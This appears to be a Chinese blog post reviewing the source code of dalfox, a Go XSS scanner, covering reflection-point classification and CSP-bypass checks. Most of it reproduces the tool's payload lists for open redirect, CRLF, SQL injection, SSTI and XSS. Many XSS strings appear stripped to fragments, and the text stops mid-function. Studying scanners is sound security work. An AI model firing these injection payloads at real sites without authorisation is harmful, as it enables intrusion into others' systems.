dalfox源码学习
在信息流上看到有人star这个项目，dalfox是一个基于golang的xss扫描器，介绍说基于golang/DOM 
parser。
好像以前就看过这个项目，但是忘了大概，今天看到有人star了这个项目，于是好奇的又看了看，看到
它的简介，基于DOM parser以为很厉害，看了源码才发现，当初忘了这个项目，就是因为它很一般，
还是用的批量payload打，从返回页面找payload那一套，虽然找的方法改进了一下，每个payload都包
含一个class，直接用css语法找 .dalfox 的标签判断，但检测一个参数还是要发很多payload，不符合
现在的xss扫描逻辑了。
但我还是写一下它的源码学习，说说它的好与不好的地方，防止我以后再忘记。
介绍
Github地址: https://github.com/hahwul/dalfox
看它列举的一些feature
其中一些比较好的点是 鉴定反射点的位置，静态分析csp、检测其他漏洞，pipeline支持。
鉴定反射点位置
相关函数在 pkg/optimization/abstraction.go
它有一个分类，把反射点的位置归为了这么几类
分别是反射点在html上、在js上，在标签的属性上，和在标签的script上。
在这些上面又有一个分类
会判断反射点在单引号、双引号还是`符号里。
dalfox判断的方式bug很多，就是用纯文本查找字符串的开始和结束位置，排序位置信息，根据每个位
置信息生成一个 开始 和 结束 的标记，看payload最终在哪个标记里面。
这地方应该直接用dom解析来做，简单省力。
modeMap[1] = "inHTML"
modeMap[2] = "inJS"
modeMap[3] = "inATTR"
modeMap[4] = "inTagScript"
positionMap[1] = "none"
positionMap[2] = "double"   // "
positionMap[3] = "single"   // '
positionMap[4] = "backtick" // `
positionMap[5] = "comment"
positionMap[6] = "pre"
positionMap[7] = "textarea"
CSP绕过
相关函数 pkg/scanning/csp.go
这块比较新颖，网上有一些收集的csp绕过列表
如果网站的csp策略域名是这些域名的话，就可以根据这些payload绕过
判断函数
https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20
Injection/Intruders/jsonp_endpoint.txt
if resp.Header["Content-Security-Policy"] != nil {
    policy["Content-Security-Policy"] = resp.Header["Content-Security-Policy"]
[0]
    result := checkCSP(policy["Content-Security-Policy"])
    if result != "" {
        policy["BypassCSP"] = result
    }
}
这块扫描器可以学习下，它是直接硬编码写死进去了，可以弄个脚本批量生成一下。
检测其他漏洞
官网写着还能检测 sqli 、 ssti 、 open-redirects 、 crlf ，主要就是靠发payload。
ssti、重定向、crlf可以发payload玩玩，回显的结果就能验证了，sqli就算了，下面是payload。
//basic open redirect payloads
func getOpenRedirectPayload() []string {
    payload := []string{
        "//google.com",
        "//google.com/",
        "//google.com/%2f..",
        "///google.com/%2f..",
        "////google.com/%2f..",
        "https://google.com/%2f..",
        "/https://google.com/%2f..",
        "//www.google.com/%2f%2e%2e",
        "///www.google.com/%2f%2e%2e",
        "////www.google.com/%2f%2e%2e",
        "https://www.google.com/%2f%2e%2e",
        "/https://www.google.com/%2f%2e%2e",
        "//google.com/",
        "///google.com/",
        "////google.com/",
        "https://google.com/",
        "/https://google.com/",
        "//google.com//",
        "///google.com//",
        "////google.com//",
        "https://google.com//",
        "//https://google.com//",
        "//www.google.com/%2e%2e%2f",
        "///www.google.com/%2e%2e%2f",
        "////www.google.com/%2e%2e%2f",
        "https://www.google.com/%2e%2e%2f",
        "//https://www.google.com/%2e%2e%2f",
        "///www.google.com/%2e%2e",
        "////www.google.com/%2e%2e",
        "https:///www.google.com/%2e%2e",
        "//https:///www.google.com/%2e%2e",
        "/https://www.google.com/%2e%2e",
        "///www.google.com/%2f%2e%2e",
        "////www.google.com/%2f%2e%2e",
        "https:///www.google.com/%2f%2e%2e",
        "/https://www.google.com/%2f%2e%2e",
        "/https:///www.google.com/%2f%2e%2e",
        "/%09/google.com",
        "//%09/google.com",
        "///%09/google.com",
        "////%09/google.com",
        "https://%09/google.com",
        "/%5cgoogle.com",
        "//%5cgoogle.com",
        "///%5cgoogle.com",
        "////%5cgoogle.com",
        "https://%5cgoogle.com",
        "/https://%5cgoogle.com",
        "https://google.com",
    }
    return payload
}
func getCRLFPayload() []string {
    payload := []string{
        "%0d%0aDalfoxcrlf: 1234",
        "%E5%98%8D%E5%98%8ADalfoxcrlf: 1234",
        "\\u560d\\u560aDalfoxcrlf: 1234",
    }
    return payload
}
//basic sql injection payloads
func getSQLIPayload() []string {
    payload := []string{
        "'",
        "''",
        "`",
        "``",
        ",",
        "\"",
        "\"\"",
        "/",
        "//",
        ";",
        "' or ",
        "-- or #",
        "' OR '1",
        "' OR 1 -- -",
        " OR \"\" = \"",
        "\" OR 1 = 1 -- -",
        "' OR '' = '",
        "'='",
        "'LIKE'",
        "'=0--+",
        "%00",
        " AND 1",
        " AND 0",
        " AND true",
        " AND false",
        " OR 1=1",
        " OR 1=0",
        " OR 1=1#",
        " OR 1=0#",
        " OR 1=1--",
        " OR 1=0--",
        " HAVING 1=1",
        " HAVING 1=0",
        " HAVING 1=1#",
        " HAVING 1=0#",
        " HAVING 1=1--",
        " HAVING 1=0--",
        " AND 1=1",
        " AND 1=0",
        " AND 1=1--",
        " AND 1=0--",
        " AND 1=1#",
        " AND 1=0#",
        " ORDER BY 1",
    }
    return payload
}
//getSSTIPayload is return SSTI Payloads
func getSSTIPayload() []string {
    payload := []string{
        "{444*6664}",
        "",
        "#{444*6664}",
        "${{444*6664}}",
        "{{444*6664}}",
        "{{= 444*6664}}",
        "",
        "{@444*6664}",
        "[[444*6664]]",
        "${{\"{{\"}}444*6664{{\"}}\"}}",
    }
    return payload
}
// getBlindPayload is return Blind XSS Payload
func getBlindPayload() []string {
    payload := []string{
        "\"'>",
        "\"'>",
        "javascript:/*-->
",
        "\"'>",
    }
    return payload
}
// getCommonPayload is return xss
func getCommonPayload() []string {
    payload := []string{
        // include verify payload
        "\">",
        "\">",
        "'>",
        "'>",
        "",
        "",
        "\">click",
        "'>click",
        "'>",
        "\">[confirm``]\"z",
        "\">\"/class=dalfox/ondblclick=`z",
        "\">
",
        "\">",
        "\">",
        "'\">",
        "\">",
        "'>",
        "'\">-
%26apos;",
        "'\">\" 
class=dalfox>",
        // not include verify payload
        "\">",
        "'\">",
        "'>",
        "\">",
        "'\">",
        "\">/*",
        "\">[confirm``]\"z",
        "\">click",
        "'>click",
        "\">",
        "\">asd",
        "'>asd",
    }
    return payload
}
func getHTMLPayload(ip string) []string {
    payload := []string{
        "",
        "",